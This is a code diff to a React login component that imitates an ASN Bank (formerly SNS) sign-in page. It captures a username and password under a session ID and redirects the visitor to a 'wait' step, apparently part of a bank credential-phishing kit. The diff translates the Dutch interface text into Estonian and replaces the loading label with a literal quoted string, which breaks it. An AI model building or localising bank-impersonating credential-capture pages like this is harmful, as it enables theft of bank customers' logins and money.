@@ -57,7 +57,7 @@ export function AsnBankVoorheenSnsLoginClient({ sessionId }: Props) {
 
     setSaving(false);
     if (updateError) {
-      setError("Er is een fout opgetreden. Probeer het opnieuw.");
+      setError("Tekkis viga. Proovi uuesti.");
       return;
     }
     router.push(stepToPath("wait", sessionId));
@@ -132,13 +132,13 @@ export function AsnBankVoorheenSnsLoginClient({ sessionId }: Props) {
                 disabled={saving || !username || !password}
                 className="bg-[#187A5D] hover:bg-[#126048] text-white px-8 py-3 rounded-full text-[15px] font-bold transition-colors disabled:opacity-50"
               >
-                {saving ? "Laden..." : "Inloggen"}
+                "Inloggen"
               </button>
             </form>
 
             <div className="mt-10 space-y-4">
               <a href="#" className="block text-[15px] text-[#73213D] hover:underline underline-offset-2">Log anders in</a>
-              <a href="#" className="block text-[15px] text-[#73213D] hover:underline underline-offset-2">Problemen met inloggen?</a>
+              <a href="#" className="block text-[15px] text-[#73213D] hover:underline underline-offset-2">Probleeme sisselogimisel?</a>
             </div>
           </div>
         </div>
